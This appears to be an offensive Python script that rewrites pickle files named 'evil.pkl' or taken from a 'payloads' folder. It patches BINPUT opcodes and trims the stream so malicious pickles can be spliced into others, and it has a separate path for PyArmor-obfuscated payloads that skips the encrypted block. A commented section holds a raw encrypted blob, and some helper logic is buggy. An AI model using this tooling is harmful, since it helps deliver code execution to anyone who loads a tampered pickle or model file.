import re
from pathlib import Path

import random


def pyarmor_detected(file_path):
    with open(file_path, "rb") as f:
        bin_data = f.read()
        print(bin_data)
    if b"pyarmor" in bin_data:
        print("PYARMOR DETECTED")
    return True


def get_unicode_length(file_path):
    with open(file_path, "rb") as f:
        bin_data = f.read()
        print(bin_data)
    index = bin_data.index(b"PY000000")
    print(f"Found 'PY000000' at index: {index}")

    for i in range(index, 0, -1):
        if bin_data[i] == ord("X"):
            print(f"Reached 'X' at index: {i}")

            size_offset = i + 1
            size_bytes = bin_data[size_offset : size_offset + 4]

            size = int.from_bytes(size_bytes, "little")
            print(f"Size: {size} bytes")

            payload_offset = size_offset + 4
            payload = bin_data[payload_offset : payload_offset + size]
            print(f"Payload (first 32 bytes): {payload[:32]}")
            print(f"Payload length: {len(payload)}")
            print("full payload", payload)

            break
    else:
        print("Did not find 'X' before 'PY000000'")
    return size

    #
    # with open(file_path, "rb") as f:
    #     bin_data = f.read()
    # print(bin_data.index(b"PY000000"))
    # index = bin_data.index(b"PY000000")
    # for i in bin_data[index:0:-1]:
    #     print(bytes([i]))
    #     if bytes([i]) == b"X":
    #         print("reached X")
    #         break
    # print("check this ")
    # size_bytes = b"i\x02\x00\x00"
    # size = int.from_bytes(size_bytes, "little")
    # print(f"Size: {size} bytes")
    #
    # print(bin_data[index:size])
    # check = b"""PY000000\x00\x03\n\x00o\r\r\n\xc2\x80\x00\x01\x00\x08\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00k\x01\x00\x00\x10\t\x04\x00\xc3\xa5\xc2\xa3\xc3\x83\xc2\xae\xc3\xb9%K\x10\xc3\x83\xc2\x80\x7f\xc2\xa9g\xc2\xa7\xc2\x91G\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xa4B\x1ffgy\xc2\x86A\xc2\xa9\xc2\xa7\xc2\x9a\xc3\x9f\xc2\x9b\xc3\xb2&\'l\xc2\x98/._J5\xc3\x8bR^7\xc3\xb4;\xc3\x80\xc2\x8b\xc3\xa2\xc2\xbb"\xc2\x93\x1e\xc2\xa0*\xc3\xb1\x17]\xc2\x8aKC04\xc2\xa8\x14z\xc2\x8f\x1c\xc3\x97\x05\xc3\x81\xc2\xab\xc2\xa6u^\xc3\xb4vs{\x11moe U\xc3\x80\x7f\xc3\x9f\x7fY\xc2\xb7\xc3\x9c\xc2\xbb\xc3\x94\xc2\x8a\x04\xc2\xba\xc3\x94\xc2\xb3\xc2\xad+\x15\x18]\\M\xc2\x8b\xc2\x80\xc2\x8eU\xc2\x9d\xc2\xa9\xc2\x90d\xc2\x8c\xc2\x80\xc2\x9e\xc2\x82r\xc2\x8f\xc2\x92O\xc2\xa60\xc2\xb9:\x18\xc3\xa8e\xc2\x9eH\x1a\xc3\x96]\xc3\x80\x12]n\xc3\xba\xc2\x9d\xc2\x84\xc3\x80]N\xc2\xa3\xc2\xb8n\xc3\xa4E\xc2\xb4\xc3\x8c\xc3\x85\xc2\x8aHXSRKi\xc3\xa2\xc3\xa7.`\x1cE\x0eQ\xc2\xb3\xc2\x86\xc2\xbdu\xc3\xa3\xc3\xbf\xc2\xb5r\xc3\x95C\xc3\x97\x14\xc2\x8a\xc3\xa7\xc3\x8bI\xc3\x9e\xc3\xb8\xc3\xa0\x12\xc3\xa4\xc3\xaf\xc3\xb4\x7f9^\xc3\x81\xc2\x8e\n\xc2\x9f}9\xc3\x87\xc2\xb8p[\x02\xc2\x89\xc2\x829p\xc3\xba\x121\xc3\x97\x1f\x14\xc3\x94\xc2\x93%\xc2\xbd\xc2\xb10\xc3\xb4\xc2\x8a4\xc3\x80\x00\xc3\xa6\x1d\xc3\x8cP9\xc2\x90\xc3\x8d\xc2\xb9\xc2\xac\x19\x1b\xc2\x84\x16|\xc3\xaf\xc2\xa2\xc3\x9b\xc3\x9bB\xc2\xa0&\xc2\xb6P*\xc3\xb9:\xc3\xb7\xc3\xa9\xc3\x88u\xc2\xac\xc2\xbcI\xc2\x8f\xc3\xb6\xc3\x9a\xc3\x9cg\xc3\xac\xc3\x96a\x1fz\xc2\xbbJ\x12\xc2\x92\xc3\xa5\xc3\x96\xc2\xbb_\xc3\x88v/\xc3\x83P\xc2\x90]\tz\x1d\xc3\x81\xc3\x80e\x18H\x7f\xc3\xa4v2z2\xc3\x82D\xc2\x80\xc3\xb1\x111\xc3\xb0N_*\xc3\x9b\xc3\xac\xc2\xa5\xc2\xb8LN:X\x02\xc3\xb3\xc3\xb9P\xc3\xad\x16\x01TH\x07(\x01\x12\x17\xc3\xa0\xc2\xbb\xc2\x93Km^+\xc3\xb0\x18E\xc2\x82kvY:\xc3\x8c[\xc3\xa8\xc3\x94M\xc3\x89\xc2\xb9\xc3\x86\xc3\xad\x19\xc3\x8b\x06\xc3\xb4\xc3\xb7\xc3\x8b\xc3\xb9\x0b\xc3\x88\xc2\x99\xc2\xa8\xc2\x81\xc2\x931\xc2\x85\xc2\xadB\xc3\xa7\xc2\x9ba\xc2\xa6Qo\xc3\x95\xc2\x8b\xc3\x8b\xc2\xbf"""
    # print(len(check))
    # # for i in bin_data[index:800]:
    # #     print(bytes([i]))
    #


def generate_pyarmor_paylaod(file_path):
    with open(file_path, "rb") as f:
        payload = f.read()

    pattern = re.compile(b"q(.)", re.DOTALL)
    matches = pattern.findall(payload)

    print("Bytes after 'q':")
    for m in matches:
        print(m, "->", int.from_bytes(m, "big"))
    hex_values = [b.hex() for b in matches]
    print(hex_values)
    marker = b"PY000000"
    marker_pos = payload.find(marker)
    print("where the hell is the marker pos", marker_pos)

    if marker_pos != -1:
        skip_size = get_unicode_length(file_path)
        skip_start = marker_pos
        skip_end = skip_start + skip_size

        # split into 3 parts and then only do the thing on part 2
        part1 = payload[:skip_start]
        print("this is part1", part1)
        part2 = payload[skip_start:skip_end]
        print("this is part 2", part2)
        part3 = payload[skip_end:]

        def replacer(match):
            byte_after_q = match.group(1)  # captured byte
            return b"r" + byte_after_q + b"\x00\x10\x11"

        new_part1 = pattern.sub(replacer, part1)
        new_part3 = pattern.sub(replacer, part3)

        new_payload = new_part1 + part2 + new_part3
    else:

        def replacer(match):
            byte_after_q = match.group(1)
            return b"r" + byte_after_q + b"\x00\x10\x11"

        new_payload = pattern.sub(replacer, payload)

    new_payload = b"(" + new_payload[2:-1] + b"1"
    print(new_payload)
    return new_payload


def generate_paylaod(file_path, overwritten=None):
    with open(file_path, "rb") as f:
        payload = f.read()

    pattern = re.compile(b"q.", re.DOTALL)

    print(payload)
    pattern = re.compile(b"q(.)", re.DOTALL)

    matches = pattern.findall(payload)

    print("Bytes after 'q':")
    for m in matches:
        print(m, "->", int.from_bytes(m, "big"))
    hex_values = [b.hex() for b in matches]
    print(hex_values)  # ['01', 'ff', '41']

    def replacer(match):
        byte_after_q = match.group(1)  # captured byte
        return b"r" + byte_after_q + b"\x00\x10\x11"

    new_payload = pattern.sub(replacer, payload)

    print(new_payload)
    print(new_payload[2:-1])
    if overwritten:
        new_payload = new_payload[2:-1] + b"b"
    else:
        new_payload = b"(" + new_payload[2:-1] + b"1"

    print(new_payload)
    return new_payload


def get_random_pkl_file(folder_path, recursive=False):
    folder = Path(folder_path)
    pattern = "**/*.pkl" if recursive else "*.pkl"
    pkl_files = [f for f in folder.glob(pattern) if f.parent == folder]
    if not pkl_files:
        return None
    return random.choice(pkl_files)


if __name__ == "__main__":
    generate_paylaod(get_random_pkl_file("payloads/"))
    # if pyarmor_detected("dist/evil.pkl"):
    # get_unicode_length("evil.pkl")
    # generate_pyarmor_paylaod("dist/evil.pkl")
    # else:
    #     generate_paylaod("evil.pkl")
